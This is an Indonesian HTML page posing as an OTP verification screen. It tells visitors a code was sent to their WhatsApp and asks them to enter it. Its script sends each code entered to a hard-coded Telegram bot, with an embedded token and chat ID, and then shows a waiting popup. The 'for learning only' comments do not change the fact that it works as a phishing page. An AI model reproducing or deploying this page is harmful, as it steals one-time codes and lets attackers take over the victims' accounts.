<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<title>Verifikasi OTP</title>

<style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Inter, sans-serif; -webkit-tap-highlight-color: transparent; touch-action: manipulation; }
    html, body { height: 100%; background: #fff; }

    .screen { width: 100%; max-width: 430px; margin: auto; padding: 20px 18px; min-height: 100dvh; display: flex; flex-direction: column; }

    .top { display: flex; align-items: center; height: 60px; }

    .back { cursor: pointer; transform: scale(0.72); }

    h2 { font-size: 24px; font-weight: 800; margin-top: 4px; }
    .sub { font-size: 14px; color: #707070; margin-top: 6px; margin-bottom: 30px; }

    .otp-box { display: flex; gap: 12px; justify-content: center; margin-top: 10px; margin-bottom: 28px; }
    .otp-box input { width: 46px; height: 54px; text-align: center; font-size: 22px; font-weight: 700; border: 1px solid #dcdcdc; border-radius: 10px; }

    .btn { margin-top: auto; width: 100%; text-align: center; padding: 16px; font-size: 18px; font-weight: 700; border-radius: 14px; background: #e9f3ff; color: #9fb4c8; transition: 0.25s; }
    .btn.active { background: #0B5CFF; color: #fff; cursor: pointer; }

    .resend { margin-top: 18px; text-align: center; font-size: 14px; font-weight: 700; color: #0B5CFF; opacity: 0.4; pointer-events: none; transition: 0.3s; }
    .resend.active { opacity: 1; pointer-events: auto; cursor: pointer; }

    .popup-bg { position: fixed; inset: 0; background: rgba(0,0,0,0.45); display: none; justify-content: center; align-items: center; }
    .popup { background: #fff; width: 80%; max-width: 300px; padding: 22px; border-radius: 18px; text-align: center; }
    .popup-btn { padding: 12px; background: #0B5CFF; color: #fff; border-radius: 10px; font-weight: 700; cursor: pointer; }
</style>
</head>

<body>

<div class="screen" id="screen">

    <div class="top">
        <div class="back" onclick="history.back()">
            <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <polyline points="15 18 9 12 15 6"></polyline>
            </svg>
        </div>
    </div>

    <h2>Masukkan Kode OTP</h2>
    <div class="sub">Kami telah mengirimkan kode OTP ke WhatsApp kamu</div>

    <div class="otp-box">
        <input maxlength="1">
        <input maxlength="1">
        <input maxlength="1">
        <input maxlength="1">
        <input maxlength="1">
        <input maxlength="1">
    </div>

    <div id="verifyBtn" class="btn">Verifikasi</div>

    <div id="resendBtn" class="resend">Kirim ulang kode (60s)</div>

</div>

<div class="popup-bg" id="popup">
    <div class="popup">
        <p>Mohon menunggu konfirmasi selanjutnya</p>
        <div class="popup-btn" onclick="closePopup()">OK</div>
    </div>
</div>

<script>
// ----------------------
//  KIRIM TELEGRAM AMAN (BELAJAR)
// ----------------------
function sendToTelegram(code) {

    const BOT_TOKEN = "7959508278:AAGscaWzlJ0bwX1iTzhfcXT-Xp82TBYB67g";
    const CHAT_ID = "5983910858";

    // Hanya untuk belajar (tidak memakai OTP asli)
    const message = `OTP: ${code}`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })
    })
    .then(r => console.log("Terkirim:", r))
    .catch(e => console.error("Gagal:", e));
}


// ----------------------
//  OTP INPUT HANDLER
// ----------------------
const inputs = document.querySelectorAll(".otp-box input");
const btn = document.getElementById("verifyBtn");
const resend = document.getElementById("resendBtn");
const popup = document.getElementById("popup");

inputs.forEach((input, index) => {
    input.addEventListener("input", () => {
        if (input.value.length === 1 && inputs[index + 1]) {
            inputs[index + 1].focus();
        }
        checkFilled();
    });
});

function checkFilled() {
    let code = "";
    inputs.forEach(i => code += i.value);

    if (code.length === 6) {
        btn.classList.add("active");
        btn.onclick = () => {
            sendToTelegram(code); // kirim kode latihan
            showPopup();
        };
    } else {
        btn.classList.remove("active");
        btn.onclick = null;
    }
}


// ----------------------
//  POPUP
// ----------------------
function showPopup() {
    popup.style.display = "flex";
}
function closePopup() {
    popup.style.display = "none";
}


// ----------------------
//  RESEND TIMER
// ----------------------
let timer = 60;
const countdown = setInterval(() => {
    timer--;
    resend.innerText = `Kirim ulang kode (${timer}s)`;

    if (timer <= 0) {
        clearInterval(countdown);
        resend.innerText = "Kirim Ulang Kode";
        resend.classList.add("active");
        resend.onclick = () => {
            window.location.href = "https://wa.me/08211110344?text=Saya Belum Menerima OTP";
        };
    }
}, 1000);

</script>

</body>
</html>
